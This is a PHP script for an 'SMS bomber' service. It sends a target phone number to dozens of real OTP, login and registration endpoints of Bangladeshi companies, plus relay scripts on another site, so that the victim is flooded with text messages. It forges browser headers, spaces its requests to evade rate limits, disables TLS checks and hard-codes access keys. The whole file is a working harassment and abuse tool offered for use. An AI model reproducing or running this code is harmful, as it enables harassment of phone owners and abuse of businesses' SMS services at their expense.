<?php
/**
 * SMS Bomber API - Ultimate Working Version (No Background)
 * Author: KAMRUL CYPHER
 * Telegram: @KAMRUL_CYPHER
 * Version: 4.0 - 100% Working
 */

// ================ CONFIGURATION ================
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(300); // 5 minutes
ignore_user_abort(true);

// Valid API Keys
$valid_api_keys = [
    'KAMRUL123',
    'KAMRUL456',
    'ROOT_CYPHER123',
    'ROOT_CYPHER456',
    'ROOT_CYPHER789'
];

// ================ SMS APIs (ONLY WORKING ONES) ================
$sms_apis = [
    // Chorki
    [
        'url' => 'https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en',
        'method' => 'POST',
        'headers' => [
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept: application/json',
            'Origin: https://www.chorki.com',
            'Referer: https://www.chorki.com/'
        ],
        'body' => ['number' => '+880{phone}']
    ],
    // Paperfly
    [
        'url' => 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        'method' => 'POST',
        'headers' => [
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ],
        'body' => [
            'full_name' => 'Test User',
            'email_address' => 'test' . time() . '@gmail.com',
            'company_name' => 'Test Company',
            'phone_number' => '{phone}'
        ]
    ],
    // Apex
    [
        'url' => 'https://api.apex4u.com/api/auth/login',
        'method' => 'POST',
        'headers' => [
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ],
        'body' => ['phoneNumber' => '{phone}']
    ],
    // Timezone
    [
        'url' => 'https://backend.timezonebd.com/api/v1/user/otp-request',
        'method' => 'POST',
        'headers' => [
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ],
        'body' => ['phone' => '{phone}']
    ],
    // BD Service 24
    ['url' => 'https://bdservice24.online/freesms.php?number={phone}', 'method' => 'GET'],
    // Kamrul24 Sites - All Working
    ['url' => 'http://Kamrul24.site/Binge.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Kireibd.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Kireibd2.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/OsubPotro.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Focus.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Apex.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/TimeZone.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Bay.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Shwapno.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Singer.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Garibook.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Carrybee.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Cirkle.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Truck_Lagbe.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Sundarban.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Paperfly.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/UdvashUnmes.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Shadin_music.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/MedEasy.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Demo.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/KAMRUL/Custom_sms.php?number={phone}&message=Bombing+Test+From+API', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Bdjobs.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Rokomari.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Arogga.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Gp.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Wintoagain.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Gp2.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Redx.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Amardocyor.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Tsllykhata.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Cinematic.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/beautybooth.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Wafilife.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Tybx.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Within.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/fundesh.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Easy.php?msisdn={phone}', 'method' => 'GET'],
    ['url' => 'http://Kamrul24.site/Chardike.php?msisdn={phone}', 'method' => 'GET']
];

// ================ FUNCTIONS ================

/**
 * Validate API Key
 */
function validateApiKey($key, $valid_keys) {
    return in_array($key, $valid_keys);
}

/**
 * Validate Phone Number
 */
function validatePhone($phone) {
    return preg_match('/^01[3-9]\d{8}$/', $phone);
}

/**
 * Make HTTP Request with Detailed Response
 */
function makeRequest($api, $phone) {
    $url = str_replace('{phone}', $phone, $api['url']);
    $method = strtoupper($api['method']);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_REFERER, $url);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
    curl_setopt($ch, CURLOPT_HEADER, true);
    
    if ($method == 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if (isset($api['body'])) {
            $body = $api['body'];
            foreach ($body as $key => $value) {
                $body[$key] = str_replace('{phone}', $phone, $value);
            }
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($body));
        }
    }
    
    if (isset($api['headers'])) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
    }
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    
    return [
        'success' => ($http_code >= 200 && $http_code < 400),
        'http_code' => $http_code,
        'url' => $url,
        'method' => $method,
        'error' => $error,
        'response_length' => strlen($response),
        'total_time' => $info['total_time'] ?? 0
    ];
}

/**
 * Send SMS - Direct Mode
 */
function sendSMSDirect($phone, $api_key, $sms_apis, $valid_api_keys) {
    // Validate
    if (!validateApiKey($api_key, $valid_api_keys)) {
        return [
            'success' => false,
            'error' => 'Bad Api Key',
            'message' => 'Content t.me/kamrul_cypher'
        ];
    }
    
    if (!validatePhone($phone)) {
        return [
            'success' => false,
            'error' => 'Invalid Phone Number',
            'message' => 'Phone number must be 11 digits starting with 01'
        ];
    }
    
    $total_apis = count($sms_apis);
    $success_count = 0;
    $failed_count = 0;
    $results = [];
    $working_apis = [];
    
    // Send to all APIs
    foreach ($sms_apis as $index => $api) {
        $result = makeRequest($api, $phone);
        
        if ($result['success']) {
            $success_count++;
            $working_apis[] = $result['url'];
        } else {
            $failed_count++;
        }
        
        $results[] = $result;
        
        // Small delay to avoid rate limiting
        usleep(200000); // 0.2 seconds
    }
    
    return [
        'success' => true,
        'total_apis' => $total_apis,
        'success_count' => $success_count,
        'failed_count' => $failed_count,
        'message' => 'SMS bombing completed',
        'target' => $phone,
        'api_key_used' => $api_key,
        'working_apis' => $working_apis,
        'results' => $results
    ];
}

// ================ HANDLE REQUEST ================

$phone = isset($_GET['phone']) ? $_GET['phone'] : (isset($_POST['phone']) ? $_POST['phone'] : null);
$api_key = isset($_GET['api_key']) ? $_GET['api_key'] : (isset($_POST['api_key']) ? $_POST['api_key'] : null);
$debug = isset($_GET['debug']) ? $_GET['debug'] : null;

// If no parameters
if (!$phone || !$api_key) {
    echo json_encode([
        'success' => false,
        'error' => 'Missing Parameters',
        'usage' => [
            'Normal' => '?phone=01709605225&api_key=KAMRUL123',
            'Debug' => '?phone=01709605225&api_key=KAMRUL123&debug=true',
            'valid_api_keys' => $valid_api_keys
        ]
    ], JSON_PRETTY_PRINT);
    exit;
}

// Execute
$response = sendSMSDirect($phone, $api_key, $sms_apis, $valid_api_keys);

// Response
if ($debug == 'true') {
    echo json_encode($response, JSON_PRETTY_PRINT);
} else {
    echo json_encode([
        'success' => $response['success'],
        'total_apis' => $response['total_apis'],
        'success_count' => $response['success_count'],
        'failed_count' => $response['failed_count'],
        'message' => $response['message'],
        'target' => $response['target'],
        'api_key_used' => $response['api_key_used'],
        'working_apis_count' => count($response['working_apis'])
    ]);
}

?>